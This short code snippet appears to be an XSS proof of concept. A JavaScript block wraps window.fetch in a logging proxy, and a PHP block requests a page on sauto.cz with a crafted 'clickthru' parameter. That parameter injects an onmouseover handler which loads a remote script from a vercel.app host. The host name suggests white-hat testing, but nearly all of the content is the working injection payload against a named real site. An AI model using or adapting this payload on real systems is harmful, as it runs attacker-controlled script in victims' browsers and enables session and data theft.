<script>
    window.fetch = new Proxy(window.fetch, {
        apply(fetch, that, args) {
            console.log(fetch, that, args);
            // args = args.map(arg => 'https://b2c.cpost.cz' + arg);
            return fetch.apply(that, args);
        }
    });
</script>

<?php

$content = (string) \file_get_contents('https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)');
print_r($content);

?>


